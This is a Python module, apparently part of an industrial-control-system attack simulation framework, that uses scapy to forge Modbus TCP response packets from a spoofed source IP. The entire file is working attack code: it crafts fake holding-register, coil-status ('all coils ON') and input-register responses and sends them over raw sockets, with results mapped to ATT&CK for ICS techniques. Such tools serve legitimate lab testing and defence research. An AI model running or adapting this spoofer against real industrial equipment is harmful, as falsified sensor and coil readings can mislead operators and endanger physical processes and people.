#!/usr/bin/env python3
from scapy.all import *
import logging
import time
import binascii
import os
from .attack_result import AttackResult
from .attack_mapping import get_attack_techniques

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusResponseSpoofer:
    def __init__(self, target_ip='localhost', target_port=502, spoof_ip='192.168.1.50'):
        self.target_ip = target_ip
        self.target_port = target_port
        self.spoof_ip = spoof_ip
        self.interface = "docker0"  # Default interface for Docker

    def craft_modbus_response(self, transaction_id=1, unit_id=1, function_code=3, data=b'\x00\xFF'):
        """Craft a Modbus TCP response packet"""
        # Modbus TCP header
        header = struct.pack('>HHHB',
            transaction_id,    # Transaction ID
            0,                # Protocol ID (0 for Modbus TCP)
            len(data) + 2,    # Length (data + function code + byte count)
            unit_id          # Unit ID
        )

        # Modbus response (function code + byte count + data)
        response = struct.pack('BB', function_code, len(data)) + data

        return header + response

    def send_spoofed_response(self, payload, src_port=34000, log_output=True):
        """Send a spoofed Modbus response packet"""
        try:
            # Create the complete packet
            packet = (
                Ether()/
                IP(dst=self.target_ip, src=self.spoof_ip)/
                TCP(dport=self.target_port, sport=src_port)/
                Raw(load=payload)
            )

            # Log packet details
            if log_output:
                logger.info(f"\nCrafting spoofed Modbus response:")
                logger.info(f"Source IP: {self.spoof_ip}")
                logger.info(f"Target IP: {self.target_ip}")
                logger.info(f"Target Port: {self.target_port}")
                logger.info(f"Payload (hex): {binascii.hexlify(payload).decode()}")

            # Send the packet
            sendp(packet, iface=self.interface, verbose=False)
            if log_output:
                logger.info("Spoofed response sent successfully")
            return True

        except Exception as e:
            if log_output:
                logger.error(f"Failed to send spoofed response: {e}")
            return False

    def execute(self, test_cases=None):
        """
        Execute spoof attack and return structured result.

        Args:
            test_cases (list): Optional list of test case dictionaries (default: predefined set)

        Returns:
            AttackResult with spoof metrics
        """
        result = AttackResult(
            attack='spoof',
            target={'host': self.target_ip, 'port': self.target_port, 'unit_id': None},
            params={'spoof_ip': self.spoof_ip, 'interface': self.interface},
            success=False,
            timestamp=AttackResult.create('spoof', self.target_ip, self.target_port).timestamp,
            data={},
            error=None
        )

        # Populate ATT&CK for ICS technique mapping early (before early returns)
        techniques = get_attack_techniques('spoof')
        if techniques:
            result.attack_technique = techniques[0] if len(techniques) == 1 else {'techniques': techniques}

        try:
            # Check for root privileges
            try:
                if os.geteuid() != 0:
                    result.error = "Root privileges required to send raw packets (needs sudo)"
                    return result
            except AttributeError:
                # os.geteuid() not available on Windows
                pass

            # Use default test cases if none provided
            if test_cases is None:
                test_cases = [
                    {
                        "name": "Fake Holding Register",
                        "function_code": 3,
                        "data": b'\x00\xFF',
                        "description": "Spoofing holding register with value 0x00FF"
                    },
                    {
                        "name": "Fake Coil Status",
                        "function_code": 1,
                        "data": b'\xFF\x00',
                        "description": "Spoofing coil status with all coils ON"
                    },
                    {
                        "name": "Fake Input Register",
                        "function_code": 4,
                        "data": b'\xFF\xFF',
                        "description": "Spoofing input register with maximum value"
                    }
                ]

            sent_count = 0
            failed_count = 0

            for i, test_case in enumerate(test_cases, 1):
                # Craft and send the spoofed response
                payload = self.craft_modbus_response(
                    transaction_id=i,
                    function_code=test_case['function_code'],
                    data=test_case['data']
                )

                if self.send_spoofed_response(payload, log_output=False):
                    sent_count += 1
                else:
                    failed_count += 1

                time.sleep(1)  # Delay between packets

            # Populate result data
            result.data = {
                'spoof_ip': self.spoof_ip,
                'interface': self.interface,
                'test_cases_total': len(test_cases),
                'packets_sent': sent_count,
                'packets_failed': failed_count,
                'success_rate': sent_count / len(test_cases) if test_cases else 0
            }
            result.success = sent_count > 0

        except PermissionError as e:
            result.error = f"Permission denied: {str(e)} (needs root/sudo)"
        except Exception as e:
            result.error = str(e)

        return result

    def run_spoof_attack(self):
        """Execute a series of spoofing attacks with different payloads (backward compatibility)"""
        logger.info("\nStarting Modbus Response Spoofing Attack simulation...")

        # Test cases for different types of spoofed responses
        test_cases = [
            {
                "name": "Fake Holding Register",
                "function_code": 3,
                "data": b'\x00\xFF',  # Value 255
                "description": "Spoofing holding register with value 0x00FF"
            },
            {
                "name": "Fake Coil Status",
                "function_code": 1,
                "data": b'\xFF\x00',  # All coils ON
                "description": "Spoofing coil status with all coils ON"
            },
            {
                "name": "Fake Input Register",
                "function_code": 4,
                "data": b'\xFF\xFF',  # Maximum value
                "description": "Spoofing input register with maximum value"
            }
        ]

        for i, test_case in enumerate(test_cases, 1):
            logger.info(f"\nTest Case {i}: {test_case['name']}")
            logger.info(f"Description: {test_case['description']}")

            # Craft and send the spoofed response
            payload = self.craft_modbus_response(
                transaction_id=i,
                function_code=test_case['function_code'],
                data=test_case['data']
            )

            self.send_spoofed_response(payload)
            time.sleep(1)  # Delay between packets

        logger.info("\nSpoofing attack simulation completed")

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        logger.error("This script requires root privileges to send raw packets")
        logger.error("Please run with sudo")
        sys.exit(1)

    # Create and run the spoofer
    spoofer = ModbusResponseSpoofer()
    spoofer.run_spoof_attack()
